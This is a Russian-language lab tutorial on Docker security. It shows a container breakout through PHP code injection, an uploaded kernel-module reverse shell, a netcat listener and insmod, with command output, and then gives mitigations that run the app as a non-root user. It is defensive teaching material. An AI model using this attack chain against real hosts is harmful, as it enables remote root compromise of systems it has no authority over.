# SECINFO: Docker. Part I. Root in main process

## Intro

Не мало уже сказано о том, что не следует запускать приложения в docker-контейнере из-под пользователя `root`. Данная
статья должна проиллюстрировать почему не следует этого делать.

Для запуска потребуется:

- virtualbox
- vagrant
- ansible

## Thesaurus

`RCE` - Remote Code Execution

`Docker Container Breakout` - Выход из docker изоляции в хостовую систему.

`reverse shell` - схема взаимодействия с атакуемой системой, когда shell запущенный на атакуемой системе устанавливает
соединение с заранее подготовленным приложением на системе атакующего. Позволяет обойти фаервол.

## Stand

Стенд представляет из себя две виртуальные машины:

- жертву `victim`
- атакующего `hacker`
  Обе выполнены на основе ОС Debian buster.

На хосте `victim` в домашней директории пользователя `vagrant` создан файл `/home/vagrant/FLAG` содержащий
текст `WAS HACKED`. Это сделано для более простой иллюстрации выхода из docker-контейнера.

Для иллюстрации процесса `Docker Container Breakout` используется эксплуатация через модули ядра. Для реализации,
которой необходимо наличие привилегии `SYS_MODULE`. Эти привилегии по умолчанию отключены. Но необходимо понимать, что
Docker Container Breakout через модули это не единственный способ, здесь он используется как пример.

Привелегия `cap_sys_module` может быть добавлена как непосредственно установкой флага `SYS_MODULE` в
docker-compose.yml: `cap_add: ["SYS_MODULE"]`
или добавлением аргумента `--cap-add SYS_MODULE` в команду `docker run`. Так и при добавлении аргумента `--privileged` в
команду `docker run`.

Для взаимодействия между хостами `victim` и `hacker` организована сеть 192.168.50.0/24. Настройки хостов:

- `victim` IP: 192.168.50.4;
- `hacker` IP: 192.168.50.5.

Для запуска стенда выполните команду:

```
 $ vagrant up
```

## Prepare

Перед тем как продолжить выполнение команд вам нужно будет убедиться, что вы сможете найти пакет с заголовками ядра для
текущей версии ядра. Это можно сделать двумя способами на ваш выбор.

Проверяем:

```bash
$ vagrant ssh hacker
vagrant@hacker:~$ apt-cache policy linux-headers-$(uname -r)
# если для вашей версии нет заголовков, то вы получите подобное сообщение об ошибке:
N: Unable to locate package linux-headers-4.19.0-9-amd64
# если же ошибок не возникло, то данный пункт можно пропустить
```

Исправляем одним из вариантов (первый сложнее второй легче, но менее интересный):

1) подключив к вашей виртуальной машине архивные репозитории Зная вашу версию ядра (получено на предыдущем этапе) вы
   можете найти необходимый вам пакет здесь: https://snapshot.debian.org/archive/debian/
   Выбрав примерное время существования этого пакета (можно изучить release notes), вы выбираете необходимый год месяц и
   время. И далее проверяете наличие пакета в репозитории, скачивая файл packages.gz и проверяете, что в этом файле есть
   нужный вам пакет.   
   https://snapshot.debian.org/archive/debian/20200601T024402Z/dists/buster/main/binary-amd64/Packages.gz.  
   Если вы успешно нашли нужный файл, до можно добавить этот репозиторий в sources.list, например для пакета
   linux-headers-4.19.0-9:

```bash
echo "deb https://snapshot.debian.org/archive/debian/20200601T024402Z buster main" >> /etc/apt/sources.list
apt update
apt-cache policy linux-headers-$(uname -r) 
```

2) обновив ядро и заголовки на обоих виртуальных машинах

```bash
$ vagrant ssh victim
vagrant@victim:~$ sudo apt -y install linux-headers-amd64 linux-image-amd64
vagrant@victim:~$ sudo reboot
$ vagrant ssh hacker
vagrant@hacker:~$ sudo apt -y install linux-headers-amd64 linux-image-amd64
vagrant@hacker:~$ sudo reboot
```

Для запуска примера эксплуатации RCE внутри docker образа с выходом в хостовую систему, выполните следующие шаги:

```
$ vagrant ssh victim
vagrant@victim:~$ cd /vagrant/victim/
vagrant@victim:/vagrant/victim$ docker-compose up -d
```

Посмотрим от имени какого пользователя запущен процесс с pid 1 в запущенном контейнере:

```
vagrant@victim:/vagrant/victim$ docker-compose exec webapp bash
root@ef07105a20f9:/app# ls -l /proc/1          
  total 0
  dr-xr-xr-x 2 root root 0 Nov 26 17:14 attr
  ...
```

Владелец файлов в директории `/proc/<PID>` аналогичен владельцу самого процесса. Это способ определить владельца в
случае если `ps` не установлен.

## Exploitation

Так как при использовании docker ядро используеться из хостовой системы, то операции с ядром (например загрузка модуля)
выполняються сразу во всех контейнерах и хостовой системе.

Зайдём в VM `hacker`:

```
$ vagrant ssh hacker
```

Проверим от имени какого пользователя запущено web-приложение, для этого выполним команду `id`:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
  <h1> Hello world!</h1>
  uid=0(root) gid=0(root) groups=0(root)
  <br>
```

Сообщение говорит нам о том, что процесс, в контексте которого мы выполняем наши команды, запущен от имени пользователя
root.

Проверим доступность команды `capsh`, которая позволит нам просмотреть доступные нам разрешения:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('whereis capsh');"
  <h1> Hello world!</h1>
  capsh:
  <br>
```

Команда capsh не найдена. Установим ее:

```
vagrant@hacker:~$ curl -G 192.168.50.4 \
  --data-urlencode "code=system('apt-get update && apt-get install -y libcap2-bin kmod');"
...
```

Теперь посмотрим доступные разрешения:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('capsh --print');"
  <h1> Hello world!</h1>
  Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
  Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
  Securebits: 00/0x0/1'b0
   secure-noroot: no (unlocked)
   secure-no-suid-fixup: no (unlocked)
   secure-keep-caps: no (unlocked)
  uid=0(root)
  gid=0(root)
  groups=
  <br>
```

Наличие в выводе `cap_sys_module` говорит о том что мы можем воспользоваться специально подготовленным модулем для
запуска revers shell на атакуемой системе.

Соберём специально подготовленный модуль для получения shell на хостовой системе.

Так как хосты `victim` и `hacker` имеют одну и туже ОС, то мы можем откомпилировать модуль на хосте `hacker` и записать
его на хост
`victim` через RCE. Для сборки модуля выполним следующие команды:

```
vagrant@hacker:~$ cd /vagrant/hacker
vagrant@hacker:/vagrant/hacker$ sudo apt-get install linux-headers-`uname -r`
vagrant@hacker:/vagrant/hacker$ make
  make -C /lib/modules/4.19.0-9-amd64/build M=/vagrant/hacker modules
  make[1]: Entering directory '/usr/src/linux-headers-4.19.0-9-amd64'
    CC [M]  /vagrant/hacker/reverse-shell.o
    Building modules, stage 2.
    MODPOST 1 modules
    CC      /vagrant/hacker/reverse-shell.mod.o
    LD [M]  /vagrant/hacker/reverse-shell.ko
  make[1]: Leaving directory '/usr/src/linux-headers-4.19.0-9-amd64'
```

Загрузим эксплоит на хост `victim`. Для этого передадим файл в теле HTTP запроса. Но так как наш эксплоит работает с
аргументом `code`, который передается только в качестве GET аргумента. И целевая программа абсолютно не умеет
обрабатывать POST аргументы. Поэтому мы сформируем линк в котором в качестве значения аргумента `code` укажим программу,
которая будет обрабатывать POST аргументы. Текст программы будет выглядить так:

```php
move_uploaded_file($_FILES['shell']['tmp_name'], 'reverse-shell.ko');
```

Произведем urlencoding этой строки и выполним получившийся запрос:

```
vagrant@hacker:~$ curl -v  -X POST 192.168.50.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B \
-F 'shell=@reverse-shell.ko'
```

Откроем ещё один терминал на хосте `hacker` и запустим на нем netcat в режиме ожидания соединения:

```
$ vagrant ssh hacker
vagrant@hacker:~$ nc -vnlp 4444
  listening on [any] 4444 ...
```

Теперь загрузим модуль:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('insmod reverse-shell.ko');"
  <h1> Hello world!</h1>
  <br>
```

При этом во втором окне, там где мы запустили netcat, мы получим привилегированный shell на хостовой системе `victim`:

```
vagrant@hacker:~$ nc -vnlp 4444
  listening on [any] 4444 ...
  connect to [192.168.50.5] from (UNKNOWN) [192.168.50.4] 39060
  bash: cannot set terminal process group (-1): Inappropriate ioctl for device
  bash: no job control in this shell
root@victim:/# id
  id
  uid=0(root) gid=0(root) groups=0(root)
root@victim:/# cat /home/vagrant/FLAG
  cat /home/vagrant/FLAG
  WAS HACKED 
```

## Solution I

Самым простым способом решения проблемы является запуск из под не привилегированного пользователя. Для реализации этого
подхода на хосте `victim` откройте Dockerfile и добавим в него строку `USER 1000`:

```
$ vagrant ssh victim
vagrant@victim:~$ cd /vagrant/victim/
vagrant@victim:/vagrant/victim$ docker-compose stop
  Stopping victim_webapp_1 ... done
vagrant@victim:/vagrant/victim$ nano Dockerfile
  ...
  USER 1000
  ...
<Ctrl+O><Ctrl+X>
vagrant@victim:/vagrant/victim$ docker-compose up --build -d
  Building webapp
  Step 1/5 : FROM php:7.4-cli
   ---> 639632eff06b
  Step 2/5 : WORKDIR /app
   ---> Using cache
   ---> 6cd15b0ede2b
  Step 3/5 : USER 1000
   ---> Running in 84916b1065ad
  Removing intermediate container 84916b1065ad
   ---> 07fe5524f58b
  Step 4/5 : COPY index.php index.php
   ---> 789aa580e832
  Step 5/5 : CMD [ "php", "-S", "0.0.0.0:80" ]
   ---> Running in fd3e54dd7ef2
  Removing intermediate container fd3e54dd7ef2
   ---> 3afd0af1371b

  Successfully built 3afd0af1371b
  Successfully tagged victim_webapp:latest
  Recreating victim_webapp_1 ... done
```

Теперь выполним проверку с хоста `hacker`:

```
$ vagrant ssh hacker
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
  <h1> Hello world!</h1>
  uid=1000 gid=0(root) groups=0(root)
  <br>
```

Как мы видим приложение запущено из под пользователя с UID=1000. Тем не менее попробуем установить необходимые пакеты:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('apt-get update 2>&1 && apt-get install -y libcap2-bin kmod 2>&1');"
  <h1> Hello world!</h1>
  Reading package lists...
  E: List directory /var/lib/apt/lists/partial is missing. - Acquire (13: Permission denied)
  <br>
```

Несмотря на то что установить `kmod` не удалось попробуем загрузить модуль

```
vagrant@hacker:~$ cd /vagrant/hacker/
vagrant@hacker:/vagrant/hacker$ curl -X POST 192.168.50.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B -F 'shell=@reverse-shell.ko'
  <h1> Hello world!</h1>
  <br />
  <b>Warning</b>:  move_uploaded_file(reverse-shell.ko): failed to open stream: Permission denied in <b>/app/index.php(3) : eval()'d code</b> on line <b>1</b><br />
  <br />
  <b>Warning</b>:  move_uploaded_file(): Unable to move '/tmp/phpXpL5E6' to 'reverse-shell.ko' in <b>/app/index.php(3) : eval()'d code</b> on line <b>1</b><br />
  <br>
```

В лоб загрузить не удалось. Есть возможность попробовать загрузить в папку `tmp`. Но да же после этого выполнить
команду `insmod` не удасться.

1. kmod - не установлен и команды `insmod` просто нет
2. У не привелигированного пользователя нет прав для выполнения этой операции.

## Solution II

Не всегда есть возможность запускать docker-контейнер сразу из под не привилегированного пользователя. Иногда перед
запуском основного приложения необходимо выполнить ряд операций необходимых для его работы. Например:

- создать директории для логов или изменить их владельца;
- сгенерировать конфигурационные файлы;
- и пр.

Для выполнения этих функций используются init-скрипт, который копируются в docker-образ во время build и запускается как
`entrypoint`. Чаще всего выполнять этот init-скрипт необходимо из под привилегированного пользователя. А переход к
выполнению основного приложения происходит при помощи команды `exec`. Это необходимо для того что бы процесс с PID=1
продолжил существовать.

Большинство серверных приложений (Например nginx, apache и тп.)
после запуска мастер-процесса запускает воркеры из под не привилегированного пользователя. К сожалению не все приложения
ведут себя таким образом.

Для того, что бы реализовать запуск от имени не привилегированного пользователя предлагаю добавить в init-скрипт
конструкцию аналогичную приведённой ниже:

```
#!/bin/sh

<PREPARE>

useradd -M -u 1000 -s /usr/sbin/nologin web

exec sudo -u web "$@"
```

Для реализации этого метода нам необходимо добавить в образ команду
`sudo`.

Теперь зайдём на хост `victim` и отредактируем `Dockerfile`
добавим в него следующие строки:

```
$ vagrant ssh victim
vagrant@victim:~$ cd /vagrant/victim/
vagrant@victim:/vagrant/victim$ docker-compose stop
  Stopping victim_webapp_1 ... done
vagrant@victim:/vagrant/victim$ nano Dockerfile
...
RUN apt-get update && apt-get install -y sudo && rm -rf /var/lib/apt/lists/*
COPY init /usr/local/bin/
ENTRYPOINT ["/usr/local/bin/init"]
...
<Ctrl+O><Ctrl+X>
```

Теперь вновь запустим docker-compose:

```
vagrant@victim:/vagrant/victim$ docker-compose up --build -d
  Building webapp
  Step 1/7 : FROM php:7.4-cli
   ---> 639632eff06b
  Step 2/7 : WORKDIR /app
   ---> Using cache
   ---> 6cd15b0ede2b
  Step 3/7 : COPY index.php index.php
   ---> Using cache
   ---> 5dca7eea1c20
  Step 4/7 : RUN apt-get update && apt-get install -y sudo && rm -rf /var/lib/apt/lists/*
   ---> Using cache
   ---> 2c7e7373d41d
  Step 5/7 : COPY init /usr/local/bin/
   ---> 39176282c378
  Step 6/7 : ENTRYPOINT ["/usr/local/bin/init"]
   ---> Running in e91eff9f90d6
  Removing intermediate container e91eff9f90d6
   ---> 74aaf39f199d
  Step 7/7 : CMD [ "/usr/local/bin/php", "-S", "0.0.0.0:8080" ]
   ---> Running in f8f0f773dcb0
  Removing intermediate container f8f0f773dcb0
   ---> 830927363205

  Successfully built 830927363205
  Successfully tagged victim_webapp:latest
  Recreating victim_webapp_1 ... done
```

Зайдём на хост `hacker` и проверим из под какого пользователя запущен наш web-сервер:

```
vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
  <h1> Hello world!</h1>
  uid=1000(web) gid=1000(web) groups=1000(web)
  <br>
```

Недостатком данного способа является:

- Необходимость добавления sudo в docker-образ
- В результате работы конструкции `exec sudo` создаётся два процесса. Так как `sudo` работает через fork:

```
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4   6936  2224 ?        Ss   16:24   0:00 sudo -u web /usr/local/bin/php -S 0.0.0.0:8080
web         13  0.0  3.8  80160 18840 ?        S    16:24   0:00 /usr/local/bin/php -S 0.0.0.0:8080
```

## links

- https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host
- https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
